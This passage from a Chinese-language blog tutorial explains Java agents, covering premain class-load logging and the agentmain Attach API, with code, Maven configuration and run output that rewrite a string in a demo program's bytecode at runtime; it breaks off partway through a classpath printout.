<h3 id="3-2-打印加载的类"><a href="#3-2-打印加载的类" class="headerlink" title="3.2 打印加载的类"></a>3.2 打印加载的类</h3><p>一旦你addTransformer之后，需要加载的每一个类都会经过transform方法。</p>
<p>首先添加addTransformer</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shadowflow.learn;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.IllegalClassFormatException;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PreMainTraceAgent</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(String agentArgs, Instrumentation inst)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;两个参数的java agent premain&quot;</span>);</span><br><span class="line">        inst.addTransformer(<span class="keyword">new</span> DefineTransformer(), <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">DefineTransformer</span> <span class="keyword">implements</span> <span class="title">ClassFileTransformer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="keyword">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;premain load Class:&quot;</span> + className);</span><br><span class="line">            <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>执行</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">java</span> -javaagent:javaagent-demo-<span class="number">1</span>.<span class="number">0</span>-SNAPSHOT.jar -jar test-<span class="number">1</span>.<span class="number">0</span>-SNAPSHOT.jar</span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">两个参数的java agent premain</span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:java/lang/invoke/MethodHandleImpl</span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:java/lang/invoke/MethodHandleImpl<span class="meta">$1</span></span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:java/lang/invoke/MethodHandleImpl<span class="meta">$2</span></span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:java/util/<span class="keyword">function</span>/<span class="keyword">Function</span></span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:java/lang/invoke/MethodHandleImpl<span class="meta">$3</span></span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:java/lang/invoke/MethodHandleImpl<span class="meta">$4</span></span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:java/lang/ClassValue</span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:java/lang/ClassValue$Entry</span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:java/lang/ClassValue$<span class="keyword">Identity</span></span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:java/lang/ClassValue$<span class="keyword">Version</span></span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:java/lang/invoke/MemberName$Factory</span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:java/lang/invoke/MethodHandleStatics</span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:java/lang/invoke/MethodHandleStatics<span class="meta">$1</span></span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:sun/misc/PostVMInitHook</span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:sun/misc/PostVMInitHook<span class="meta">$1</span></span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:sun/usagetracker/UsageTrackerClient</span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:java/util/concurrent/atomic/AtomicBoolean</span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:sun/usagetracker/UsageTrackerClient<span class="meta">$1</span></span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:sun/usagetracker/UsageTrackerClient<span class="meta">$4</span></span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:sun/usagetracker/UsageTrackerClient<span class="meta">$3</span></span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:java/io/FileOutputStream<span class="meta">$1</span></span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:sun/launcher/LauncherHelper</span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:java/util/jar/JarVerifier</span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:java/<span class="keyword">security</span>/CodeSigner</span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:java/util/jar/JarVerifier<span class="meta">$3</span></span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:java/io/ByteArrayOutputStream</span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:java/util/concurrent/ConcurrentHashMap$ForwardingNode</span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:com/shadowflow/test/TestMain</span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:sun/launcher/LauncherHelper$FXHelper</span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:java/lang/<span class="keyword">Class</span>$MethodArray</span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:java/lang/<span class="type">Void</span></span><br><span class="line">main <span class="keyword">start</span></span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:com/shadowflow/test/Dog</span><br><span class="line"><span class="comment">-----I&#x27;am a dog!</span></span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:java/lang/Shutdown</span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:java/lang/Shutdown$<span class="keyword">Lock</span></span><br></pre></td></tr></table></figure>



<h2 id="4-JVM启动后动态Instrument"><a href="#4-JVM启动后动态Instrument" class="headerlink" title="4.  JVM启动后动态Instrument"></a>4.  JVM启动后动态Instrument</h2><p>上面介绍的Instrumentation是在 JDK 1.5中提供的，开发者只能在main加载之前添加手脚，在 Java SE 6 的 Instrumentation 当中，提供了一个新的代理操作方法：agentmain，可以在 main 函数开始运行之后再运行。</p>
<p>跟<code>premain</code>函数一样， 开发者可以编写一个含有<code>agentmain</code>函数的 Java 类：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//采用attach机制，被代理的目标程序VM有可能很早之前已经启动，当然其所有类已经被加载完成，这个时候需要借助Instrumentation#retransformClasses(Class<span class="meta">&lt;?</span>&gt;... classes)让对应的类可以重新转换，从而激活重新转换的类执行ClassFileTransformer列表中的回调</span></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="keyword">void</span> agentmain (<span class="keyword">String</span> agentArgs, Instrumentation inst)</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="keyword">void</span> agentmain (<span class="keyword">String</span> agentArgs)</span><br></pre></td></tr></table></figure>

<p>在Java6 以后实现启动后加载的新实现是Attach api。Attach API 很简单，只有 2 个主要的类，都在 <code>com.sun.tools.attach</code> 包里面：</p>
<ul>
<li><p><code>VirtualMachine</code> </p>
<p>字面意义表示一个Java 虚拟机，也就是程序需要监控的目标虚拟机，提供了获取系统信息(比如获取内存dump、线程dump，类信息统计(比如已加载的类以及实例个数等)， loadAgent，Attach 和 Detach （Attach 动作的相反行为，从 JVM 上面解除一个代理）等方法，可以实现的功能可以说非常之强大 。该类允许我们通过给attach方法传入一个jvm的pid(进程id)，远程连接到jvm上 。</p>
</li>
<li><p>VirtualMachineDescriptor</p>
<p>则是一个描述虚拟机的容器类，配合 VirtualMachine 类完成各种功能。</p>
</li>
</ul>
<p>attach实现动态注入的原理如下：</p>
<p>通过VirtualMachine类的<code>attach(pid)</code>方法，便可以attach到一个运行中的java进程上，之后便可以通过<code>loadAgent(agentJarPath)</code>来将agent的jar包注入到对应的进程，然后对应的进程会调用agentmain方法。</p>
<p><img src="../images/pic/java-agent1.jpg"></p>
<p>既然是两个进程之间通信那肯定的建立起连接，VirtualMachine.attach动作类似TCP创建连接的三次握手，目的就是搭建attach通信的连接。而后面执行的操作，例如vm.loadAgent，其实就是向这个socket写入数据流，接收方target VM会针对不同的传入数据来做不同的处理。</p>
<p>我们来测试一下agentmain的使用：</p>
<h3 id="测试用例"><a href="#测试用例" class="headerlink" title="测试用例"></a>测试用例</h3><p><strong>第一步：编写被代理的类：</strong></p>
<p>我们先写一个死循环的java程序，然后然后让它运行，在运行中进行Attach</p>
<p>每隔3秒打印Nice!</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shadowflow.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sayNice</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Nice!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            sayNice();</span><br><span class="line">            Thread.sleep(<span class="number">1000</span> * <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后运行</p>
<p><strong>第二步：编写agent:</strong></p>
<p>写一个java agent，这次我们不自动生成MANIFEST.MF。在resources目录下新建MANIFEST.MF，添加如下</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">Agent-Class:</span> <span class="string">com.shadowflow.sec.AgentMain</span></span><br><span class="line"><span class="attr">Can-Redefine-Classes:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">Can-Retransform-Classes:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>META-INF/MAINFEST.MF 参数：</p>
<figure class="highlight oxygene"><table><tr><td class="code"><pre><span class="line">Premain-<span class="keyword">Class</span>：指定包含 premain 方法的类名。</span><br><span class="line">Agent-<span class="keyword">Class</span>：指定包含 agentmain 方法的类名。</span><br><span class="line">Boot-<span class="keyword">Class</span>-Path：指定引导类加载器搜索的路径列表。查找类的特点于平台的机制失败后，引导类加载器会搜索这些路径。</span><br><span class="line">Can-Redefine-<span class="keyword">Class</span>：是否能重新定义此代理所需的类，默认为 <span class="keyword">false</span>。</span><br><span class="line">Can-Retransform-<span class="keyword">Class</span>：是否能重新转换此代理所需的类，默认为 <span class="keyword">false</span>。</span><br><span class="line">Can-<span class="keyword">Set</span>-Native-<span class="function"><span class="keyword">Method</span>-<span class="title">Prefix</span>：是否能设置此代理所需的本机方法前缀，默认值为 <span class="title">false</span>。</span></span><br></pre></td></tr></table></figure>

<p>agent类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shadowflow.sec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.IllegalClassFormatException;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.UnmodifiableClassException;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AgentMain</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">agentmain</span><span class="params">(String agentArgs, Instrumentation inst)</span> <span class="keyword">throws</span> ClassNotFoundException, UnmodifiableClassException </span>&#123;</span><br><span class="line">        inst.addTransformer(<span class="keyword">new</span> Transformer(), <span class="keyword">true</span>);</span><br><span class="line">        inst.retransformClasses(Class.forName(<span class="string">&quot;com.shadowflow.test.MyClass&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Transformer</span> <span class="keyword">implements</span> <span class="title">ClassFileTransformer</span> </span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">byte</span>[] transform(ClassLoader loader, String className,</span><br><span class="line">                                Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain,</span><br><span class="line">                                <span class="keyword">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 将常用的类名转换为 JVM 认识的类名</span></span><br><span class="line">            className = className.replace(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;.&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 如果类名为我们指定的类</span></span><br><span class="line">            <span class="keyword">if</span> (className.equals(<span class="string">&quot;com.shadowflow.test.MyClass&quot;</span>)) &#123;</span><br><span class="line">                <span class="comment">// 进一步进行处理，替换掉输出字符串</span></span><br><span class="line">                System.out.println(className + <span class="string">&quot;.....&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> ClassHandler.replaceBytes(className, classfileBuffer);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>依赖的ClassHandler:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shadowflow.sec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] replaceBytes(String className, <span class="keyword">byte</span>[] classBuffer) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将类字节码转换成byte字符串</span></span><br><span class="line">        String bufferStr = Arrays.toString(classBuffer);</span><br><span class="line">        System.out.println(className + <span class="string">&quot;类替换前的字节码:&quot;</span> + bufferStr);</span><br><span class="line"></span><br><span class="line">        bufferStr = bufferStr.replace(<span class="string">&quot;[&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;]&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 查找需要替换的Java二进制内容</span></span><br><span class="line">        <span class="keyword">byte</span>[] findBytes = <span class="string">&quot;Nice!&quot;</span>.getBytes();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 把搜索的字符串byte转换成byte字符串</span></span><br><span class="line">        String findStr = Arrays.toString(findBytes).replace(<span class="string">&quot;[&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;]&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 二进制替换后的byte值，注意这个值需要和替换的字符串长度一致，不然会破坏常量池</span></span><br><span class="line">        <span class="keyword">byte</span>[] replaceBytes = <span class="string">&quot;Fxxk!&quot;</span>.getBytes();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 把替换的字符串byte转换成byte字符串</span></span><br><span class="line">        String replaceStr = Arrays.toString(replaceBytes).replace(<span class="string">&quot;[&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;]&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        bufferStr = bufferStr.replace(findStr, replaceStr);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 切割替换后的byte字符串</span></span><br><span class="line">        String[] byteArray = bufferStr.split(<span class="string">&quot;\\s*,\\s*&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建新的byte数组，存储替换后的二进制</span></span><br><span class="line">        <span class="keyword">byte</span>[] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[byteArray.length];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将byte字符串转换成byte</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; byteArray.length; i++) &#123;</span><br><span class="line">            bytes[i] = Byte.parseByte(byteArray[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(className + <span class="string">&quot;类替换后的字节码:&quot;</span> + Arrays.toString(bytes));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 返回修改后的二进制</span></span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>pom文件</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;project xmlns=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class="line">         xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="line">         xsi:schemaLocation=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br><span class="line">    &lt;modelVersion&gt;<span class="number">4.0</span><span class="number">.0</span>&lt;/modelVersion&gt;</span><br><span class="line">    &lt;build&gt;</span><br><span class="line">        &lt;plugins&gt;</span><br><span class="line">            &lt;plugin&gt;</span><br><span class="line">                &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;</span><br><span class="line">                &lt;artifactId&gt;maven-jar-plugin&lt;/artifactId&gt;</span><br><span class="line">                &lt;version&gt;<span class="number">3.1</span><span class="number">.0</span>&lt;/version&gt;</span><br><span class="line">                &lt;configuration&gt;</span><br><span class="line">                    &lt;archive&gt;</span><br><span class="line">                            &lt;manifestFile&gt;src/main/resources/MANIFEST.MF&lt;/manifestFile&gt;</span><br><span class="line">                    &lt;/archive&gt;</span><br><span class="line">                &lt;/configuration&gt;</span><br><span class="line">            &lt;/plugin&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &lt;/plugins&gt;</span><br><span class="line">    &lt;/build&gt;</span><br><span class="line"></span><br><span class="line">    &lt;groupId&gt;com.shadowflow&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;javaagent-demo&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">1.0</span>-SNAPSHOT&lt;/version&gt;</span><br><span class="line"></span><br><span class="line">    &lt;properties&gt;</span><br><span class="line">        &lt;maven.compiler.source&gt;<span class="number">8</span>&lt;/maven.compiler.source&gt;</span><br><span class="line">        &lt;maven.compiler.target&gt;<span class="number">8</span>&lt;/maven.compiler.target&gt;</span><br><span class="line">    &lt;/properties&gt;</span><br><span class="line">    &lt;dependencies&gt;</span><br><span class="line">        &lt;!-- https:<span class="comment">//mvnrepository.com/artifact/javassist/javassist --&gt;</span></span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;javassist&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;javassist&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">3.12</span><span class="number">.1</span>.GA&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;com.sun&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;tools&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">1.8</span>&lt;/version&gt;</span><br><span class="line">            &lt;scope&gt;system&lt;/scope&gt;</span><br><span class="line">            &lt;systemPath&gt;$&#123;env.JAVA_HOME&#125;/lib/tools.jar&lt;/systemPath&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/dependencies&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/project&gt;</span><br></pre></td></tr></table></figure>

<p>打包</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">mvn</span> clean install</span><br></pre></td></tr></table></figure>





<p><strong>第三步：编写Attach类：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shadowflow.sec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AttachTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, AttachNotSupportedException, AgentLoadException,</span></span><br><span class="line"><span class="function">            AgentInitializationException, InterruptedException </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取正在运行 JVM 列表</span></span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 遍历列表</span></span><br><span class="line">        <span class="keyword">for</span> (VirtualMachineDescriptor descriptor : list) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 根据进程名字获取进程ID, 并使用 loadAgent 注入进程</span></span><br><span class="line">            <span class="keyword">if</span> (descriptor.displayName().endsWith(<span class="string">&quot;MyClass&quot;</span>)) &#123;</span><br><span class="line">                System.out.println(descriptor.displayName());</span><br><span class="line">                VirtualMachine virtualMachine = VirtualMachine.attach(descriptor.id());</span><br><span class="line">                virtualMachine.loadAgent(<span class="string">&quot;/Users/shadowflow/code/java/javaagent-demo/target/javaagent-demo-1.0-SNAPSHOT.jar&quot;</span>, <span class="string">&quot;arg1&quot;</span>);</span><br><span class="line">                virtualMachine.detach();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行Attach类，结果如下</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_301.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/bin/</span>java -javaagent:<span class="regexp">/Applications/I</span>ntelliJ IDEA.app<span class="regexp">/Contents/</span>lib<span class="regexp">/idea_rt.jar=57991:/</span>Applications<span class="regexp">/IntelliJ IDEA.app/</span>Contents<span class="regexp">/bin -Dfile.encoding=UTF-8 -classpath /</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_301.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>charsets.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_301.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/jre/</span>lib<span class="regexp">/deploy.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_301.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>ext<span class="regexp">/cldrdata.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_301.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>ext<span class="regexp">/dnsns.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_301.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>ext<span class="regexp">/jaccess.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_301.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>ext<span class="regexp">/jfxrt.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_301.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>ext<span class="regexp">/localedata.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_301.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>ext<span class="regexp">/nashorn.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_301.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>ext<span class="regexp">/sunec.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_301.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>ext<span class="regexp">/sunjce_provider.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_301.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>ext<span class="regexp">/sunpkcs11.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_301.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>ext<span class="regexp">/zipfs.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_301.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>javaws.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_301.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/jre/</span>lib<span class="regexp">/jce.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_301.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>jfr.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_301.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/jre/</span>lib<span class="regexp">/jfxswt.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_301.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>jsse.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_301.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/jre/</span>lib<span class="regexp">/management-agent.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_301.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>plugin.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_301.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/jre/</span>lib<span class="regexp">/resources.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_301.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>rt.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_301.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/lib/</span><span class="keyword">ant</span>-javafx.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_301.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/lib/</span>dt.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_301.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/lib/</span>javafx-mx.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_301.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/lib/</span>jconsole.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_301.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/lib/</span>packager.jar:<span 